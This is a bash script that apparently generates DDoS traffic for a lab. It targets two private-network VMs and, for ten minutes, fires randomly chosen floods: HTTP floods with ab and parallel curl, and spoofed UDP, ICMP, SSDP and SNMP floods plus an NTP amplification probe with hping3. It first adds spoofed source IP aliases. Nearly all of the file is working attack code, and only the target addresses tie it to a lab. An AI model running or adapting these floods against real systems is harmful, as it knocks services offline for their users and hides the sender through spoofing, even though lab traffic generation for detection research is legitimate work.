#!/usr/bin/env bash
export LC_NUMERIC=C    # for sleep to receive 0.12 and not 0,12

#
# ddos_vm3_random.sh – DDoS & DoS Traffic Generator
#
# • Duration: 600 s (10.0 min)
# • Random techniques (each iteration chooses ONE):
#     - http_flood_ab       (ab, layer-7 HTTP flood)
#     - http_flood_curl     (parallel curl HTTP flood)
#     - udp_flood_hping     (hping3 flood pure UDP)
#     - ntp_amp             (hping3 NTP monlist → amplification)
#     - ssdp_flood_hping    (hping3 SSDP M-SEARCH flood)
#     - snmp_flood_hping    (hping3 SNMP GetRequest flood)
#     - icmp_flood_hping    (hping3 flood ICMP echo)
#
# • Tools (VM3):
#     sudo apt update
#     sudo apt install -y hping3 nping apache2-utils curl parallel
#     # nping comes with nmap, apache2-utils provides 'ab'
#
# ▶ Capture on VM1/VM2:
# (identical command to prep_victim_ddos.sh, see below)
#

# 1) root check
if (( EUID != 0 )); then
  echo "Run with sudo" >&2
  exit 1
fi

# 2) dependencies
missing=()
for cmd in hping3 nping ab curl parallel; do
  command -v "$cmd" &>/dev/null || missing+=($cmd)
done
if (( ${#missing[@]} )); then
  echo "Missing: ${missing[*]}. Install with:"
  echo "  sudo apt update && sudo apt install -y hping3 nping apache2-utils curl parallel"
  exit 1
fi

# 3) configuration
duration=600
end_time=$(( SECONDS + duration ))
targets=(192.168.56.101 192.168.56.102)
srcs=(192.168.56.{240..254})
iface=$(ip route | awk '/^default/ {print $5;exit}')
iface=${iface:-enp0s3}

# 4) IP spoof alias
for ip in "${srcs[@]}"; do
  ip addr add "$ip"/24 dev "$iface" 2>/dev/null || :
done

techs=(
  http_flood_ab
  http_flood_curl
  udp_flood_hping
  ntp_amp
  ssdp_flood_hping
  snmp_flood_hping
  icmp_flood_hping
)

echo "=== VM3: Random DDoS (${duration}s) on $iface ==="

# 5) main loop
while (( SECONDS < end_time )); do
  tech=${techs[RANDOM % ${#techs[@]}]}
  tgt=${targets[RANDOM % ${#targets[@]}]}
  src=${srcs[RANDOM % ${#srcs[@]}]}
  ts=$(date +%T)
  printf '[%s] %s → %s (src %s)\n' "$ts" "$tech" "$tgt" "$src"

  case "$tech" in
    http_flood_ab)
      ab -n10000 -c200 -H "Host: $tgt" \
         http://$tgt/ >/dev/null 2>&1 &;;
    http_flood_curl)
      seq 1 200 | parallel -j200 \
        curl -s --interface "$src" http://$tgt/ >/dev/null &;;
    udp_flood_hping)
      hping3 --udp --flood -p 80 \
        --spoof "$src" -I "$iface" "$tgt" >/dev/null 2>&1 &;;
    ntp_amp)
      # monlist (NTP v4) – ensure monlist is active in /etc/ntp.conf
      hping3 --udp -p123 -d48 \
        --spoof "$src" -I "$iface" \
        --baseport 6000 -E <(printf '\x17\x00\x03\x2a\x00\x00\x00\x00') \
        "$tgt" >/dev/null 2>&1 &;;
    ssdp_flood_hping)
      SSDP='M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:"ssdp:discover"\r\nMX:1\r\nST:ssdp:all\r\n\r\n'
      printf "$SSDP" > /tmp/ssdp.txt
      hping3 --udp --flood -p1900 \
        --spoof "$src" -I "$iface" \
        --datafile /tmp/ssdp.txt "$tgt" >/dev/null 2>&1 &;;
    snmp_flood_hping)
      SNMP_PDU=$(printf "\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05+\x06\x01\x02\x01\x01")
      printf "$SNMP_PDU" > /tmp/snmp.pdu
      hping3 --udp --flood -p161 \
        --spoof "$src" -I "$iface" \
        --datafile /tmp/snmp.pdu "$tgt" >/dev/null 2>&1 &;;
    icmp_flood_hping)
      hping3 --icmp --flood \
        --spoof "$src" -I "$iface" \
        "$tgt" >/dev/null 2>&1 &;;
  esac

  # concurrency cap (max 8)
  while (( $(jobs -r | wc -l) > 8 )); do sleep 0.2; done

  # random pause (0.1–0.5 s)
  pause=$(awk -v m=0.1 -v M=0.5 'BEGIN{srand(); printf "%.2f", m+rand()*(M-m)}')
  sleep "$pause"
done

wait
echo "=== DDoS finished ==="
